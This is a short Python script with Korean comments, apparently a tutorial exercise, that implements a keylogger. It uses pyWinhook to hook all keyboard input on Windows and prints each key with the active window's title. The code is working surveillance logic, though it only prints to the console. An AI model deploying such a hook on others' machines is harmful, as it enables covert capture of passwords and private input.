#개선된 키로깅 코드 (+어떤 파일에서의 키 이벤트인지)

#win32gui : win32 GUI API를 제공하는 파이썬 모듈
import win32gui
#pythoncom : 파이썬이 Windows시스템의 다양한 서비스 및 기능을 사용하기 위해 사용하는 패키지
import pythoncom
import pyWinhook as pyHook

#변수는 생성
curWindow = None

def getCurProc():
	global curWindow
	
	try:
		#포커스되어 있는 윈도우 핸들 hwnd 획득
		hwnd = win32gui.GetForegroundWindow()
		#윈도우 타이틀 얻음
		winTitle = win32gui.GetWindowText(hwnd)
		#윈도우 타이틀이 직전과 다르면
		if winTitle != curWindow:
			curWindow = winTitle
			print('\n[%s]' %winTitle)
		
	except:
		print('\n[Unknown Window]')
		pass


#키보드 입력을 후킹한 후 호출되는 콜백 함수
def OnKeyboardEvent(event):
	getCurProc()
	print('++ Key:', event.Key, end='')
	print('	KeyID:', event.KeyID)
	return True
	

def main():
	hm = pyHook.HookManager()
	#후킹을 처리할 콜백 함수 지정
	hm.KeyDown = OnKeyboardEvent
	#키보드 후킹을 설정하는 함수
	hm.HookKeyboard()
	#윈도우 OS에서 입력된 이벤트들을 모두 전송받을 수 있게 함
	#이벤트 없으면 여기서 대기
	pythoncom.PumpMessages()


if __name__ == '__main__':
	main()
